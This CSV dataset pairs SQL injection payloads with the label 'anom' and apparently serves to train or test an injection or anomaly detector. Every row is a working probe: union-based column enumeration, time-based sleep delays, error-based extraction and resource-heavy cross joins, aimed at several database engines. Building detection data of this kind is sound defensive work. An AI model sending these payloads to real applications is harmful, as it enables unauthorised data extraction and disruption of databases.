payload,label
"1'+(select 'yjpp' where 8966=8966;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)+'",anom
"-6122"") union all select 6578,6578--",anom
"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",anom
"-9003"")) union all select 9721,9721--",anom
"1%"")) union all select null,null,null,null,null,null#",anom
"1') or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ('iifh'='iifh",anom
1'))) waitfor delay '0:0:5' and ((('zhhf' like 'zhhf,anom
"1""))) union all select null,null,null,null,null,null,null,null--",anom
1');select sleep(5) and ('qcsv'='qcsv,anom
"-2417) union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#",anom
1;begin dbms_lock.sleep(5); end--,anom
"1') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('iwkg'='iwkg",anom
"1') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('jvll' like 'jvll",anom
1%'))) and 2444=9282#,anom
1') as irnj where 7274=7274 and 6969=(select 6969 from pg_sleep(5))--,anom
"-8124) union all select 7251,7251,7251#",anom
-4669) or 2452=1601#,anom
"1"") or 8156=(select count(*) from generate_series(1,5000000))--",anom
"1%')) union all select null,null,null--",anom
-1602' or 3038=3038,anom
-9841 where 4612=4612 union all select 4612--,anom
"1'||(select 'rfjl' where 2476=2476 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))||'",anom
"1%');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",anom
"1')) as lizu where 7691=7691 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",anom
"-3546%"" or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ""%""=""",anom
1' in boolean mode) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)#,anom
-9358' or 9887=2569--,anom
"1'||(select 'fdkl' where 4572=4572 union all select null,null,null,null,null,null,null,null,null#",anom
"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",anom
"-5989%"" union all select 3581,3581,3581,3581,3581--",anom
1) where 9167=9167;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,anom
"1"")));select pg_sleep(5)--",anom
"1%"")) union all select null--",anom
"1' in boolean mode) union all select null,null,null,null,null,null,null#",anom
-2456'))) or (8459=8459)*4906 and ((('bbkp'='bbkp,anom
"-4155'))) union all select 1775,1775,1775,1775,1775,1775,1775--",anom
